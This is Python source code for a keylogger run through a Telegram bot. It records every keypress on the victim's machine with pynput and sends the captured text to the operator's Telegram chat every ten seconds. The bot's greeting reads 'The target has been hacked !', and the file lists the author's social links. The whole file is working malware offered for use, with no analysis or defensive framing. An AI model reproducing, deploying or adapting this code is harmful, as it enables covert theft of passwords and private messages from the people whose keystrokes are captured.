import logging
import os
import asyncio
from pynput import keyboard
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s', level=logging.INFO)

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(f'{key.char}')
    except AttributeError:
        keystrokes.append(f'[{key}]')

async def send_keystrokes():
    while True:
        if keystrokes:
            message = ''.join(keystrokes)
            keystrokes.clear()

            await application.bot.send_message(chat_id="Your_Chat_ID", text=message) # Edit this 
        
        await asyncio.sleep(10)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
    '''The target has been hacked !

    /key_logger to start the key_logger
    /exit to stop the key_logger
    
    Follow me : https://x.com/hexsh1dow
    Github : https://github.com/HexShad0w
    '''
    )

async def exit_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Stopping the keylogger...')
    os._exit(0)

async def key_logger(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Keylogger started!')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    asyncio.create_task(send_keystrokes())

application = ApplicationBuilder().token("Your_Telegram_Token").build() # Edit this

application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("exit", exit_bot))
application.add_handler(CommandHandler("key_logger", key_logger))

if __name__ == "__main__":
    application.run_polling()
